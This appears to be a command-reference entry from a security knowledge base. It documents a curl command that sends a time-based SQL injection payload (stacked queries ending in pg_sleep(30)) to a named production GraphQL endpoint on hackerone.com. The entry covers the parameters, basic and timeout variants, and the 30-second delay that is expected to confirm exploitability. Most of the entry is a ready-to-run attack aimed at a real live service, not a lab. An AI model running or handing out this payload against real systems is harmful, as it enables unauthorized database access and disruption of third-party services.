---
data: >-
  curl -X POST
  https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%2830%29%3B--%27
tags:
  - sql-injection
  - reproduction
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:15:09.935Z'
id: 1a311e7f-54c6-443f-a0f0-80ce2ab58b4c
verified: false
validated: true
submitted: true
---
# curl-prod-sql-injection-reproduce

## Command

```bash
curl -X POST https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%2830%29%3B--%27
```

## Description

Reproduces SQL injection on production by sending the same payload, confirming exploitability with a delay.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| `https://hackerone.com/graphql` | Production endpoint URL | Yes |
| `embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%2830%29%3B--%27` | URL-encoded payload | Yes |

## Examples

### Basic Usage

```bash
curl -X POST https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%2830%29%3B--%27
```

### Advanced Usage

With timeout:

```bash
curl --max-time 60 -X POST https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%2830%29%3B--%27
```

## Expected Output

Response after ~30 seconds, empty JSON {} confirming execution.

## Related

- [[commands/curl-local-sql-injection-reproduce]]
- [[procedures/Reproduce-SQL-Injection-with-Malicious-Payload]]
